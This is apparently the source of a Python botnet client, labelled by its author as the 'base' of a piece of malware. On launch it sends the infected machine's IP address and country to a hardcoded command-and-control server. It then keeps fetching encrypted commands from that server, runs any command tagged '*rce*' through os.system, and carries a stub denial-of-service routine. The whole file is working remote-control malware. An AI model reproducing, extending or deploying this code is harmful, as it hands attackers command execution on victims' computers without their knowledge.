# DISCLAIMER THIS IS THE BASE AND THE FULL MALWARE WILL PROBABLY NOT BE HOSTED ON GITHUB 

# imports
import base64, time, requests, os
from os import system, name
from cryptography.fernet import Fernet
import json, html, threading, random, sys

# setting the cnc server
cnc_server = 'https://fcnc.cloudcant.repl.co'


def encode(data, key):
  f = Fernet(key)
  token = f.encrypt(data.encode("utf-8"))
  return (token.decode("utf-8"))


def decode(data, key):
  f = Fernet(key)
  return ((f.decrypt(data)).decode("utf-8"))


# getting bot ip
def getinfo(type):
  response = requests.get('http://ifconfig.net/json')
  infojson = html.unescape(response.text)
  info = json.loads(infojson)
  return info[type]


botinfo = f"{getinfo('ip')}@{getinfo('country')}"

# sending bot info
requests.get(f"{cnc_server}/bot?connect={botinfo}")


# clear the console supporting cross platform
def clear():
  if name == "nt":
    _ = system("cls")
  else:
    _ = system("clear")


# gettingn the command from the cnc server
def getcommand():
  global cnc_server
  cnc = requests.get(f"{cnc_server}/bot")
  command = html.unescape(cnc.text)
  return command


# getting the if toggle
def getcheck():
  cnc_check = requests.get(f"{cnc_server}/check")
  check = html.unescape(cnc_check.text)
  return check


def getkey():
  response = requests.get(f"{cnc_server}/key")
  key = html.unescape(response.text)
  return key


fernetkey = getkey().encode("utf-8")


# logs
def log(check):
  global command
  command = getcommand()
  clear()
  print(f"""
  {botinfo}
  ├── {cnc_server}/key
  │   └── {fernetkey}
  │       └── Test encryption
  │           ├── {encode("Hello, World!", fernetkey)}
  │           └── {decode((encode("Hello, World!", fernetkey)), fernetkey)}
  ├── {cnc_server}/bot
  │   ├── {command}
  │   └── {decode(command, fernetkey)}
  └── {cnc_server}/bot?check
      ├── {encode(check, fernetkey)}
      └── {check}
""")


# denial of service example
def dos(method, host2, port, times):
  print(f"""
  {botinfo}
  └── DOS
      └── {method}
          ├── {host2}
          ├── {port}
          └── {times}
""")
  print("Starting attack in 3 seconds")
  time.sleep(3)
  if method == "*http*":
    input("wow much http!!")
  elif method == "*udp*":
    input("wow much udp!!")
  elif method == "*tcp*":
    input("wow much tcp!!")
  elif method == "*syn*":
    input("wow much tcp!!")
  else:
    input("tf das invalid method!!")
  time.sleep(2)


# main process loop

while True:
  # getting if toggled
  status = decode(getcheck(), fernetkey)
  # if toggle is set to listen
  if status == 'listen':
    log('Listen')
    commanddec = decode(getcommand(), fernetkey)
    # checks command type
    if '*rce*' in commanddec:
      os.system(str(commanddec).replace('*rce*', ''))
    elif '*dos*' in commanddec:
      method, host, port, times = str(commanddec.replace('*dos*',
                                                         '')).split('::')
      dos(method, host, port, times)
    elif "*print*" in commanddec:
      print(str(commanddec.replace('*print*', '')))
    # if the command has nothing in it pass
    else:
      pass
  # else if toggle is set to off
  elif status == 'off':
    log('Off')
    time.sleep(2)
  # else than log err
  else:
    log('err')
    time.sleep(2)
